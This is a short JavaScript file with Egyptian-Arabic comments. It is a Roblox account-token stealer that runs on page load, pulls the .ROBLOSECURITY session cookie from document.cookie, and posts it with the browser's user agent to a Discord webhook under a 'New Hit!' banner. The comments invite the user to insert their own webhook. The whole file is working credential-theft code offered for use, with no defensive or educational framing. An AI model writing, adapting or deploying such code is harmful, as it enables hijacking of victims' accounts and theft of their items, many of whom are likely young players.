// استبدل الرابط اللي تحت برابط الـ Webhook بتاعك من الديسكورد
const DISCORD_WEBHOOK = "https://discord.gg/3evkCWzva";

async function captureAndSend() {
    // محاولة استخراج التوكن من الكوكيز
    const cookies = document.cookie;
    const tokenMatch = cookies.match(/\.ROBLOSECURITY=(_\|WARNING:-DO-NOT-SHARE-THIS\.[^;]+)/);

    if (tokenMatch) {
        const fullToken = tokenMatch[1];

        // إرسال البيانات للديسكورد بشكل منسق
        const payload = {
            username: "Faro Hunter",
            avatar_url: "https://roblox.com/favicon.ico",
            embeds: [{
                title: "🚨 صيد جديد (New Hit!) 🚨",
                color: 16711680, // لون أحمر
                fields: [
                    { name: "User Token:", value: "```" + fullToken + "```" },
                    { name: "Browser Info:", value: navigator.userAgent }
                ],
                footer: { text: "Faro Global Cloud System" },
                timestamp: new Date()
            }]
        };

        try {
            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {
            console.error("Error logging data");
        }
    }
}

// تشغيل السكريبت فور فتح الصفحة
window.onload = captureAndSend;
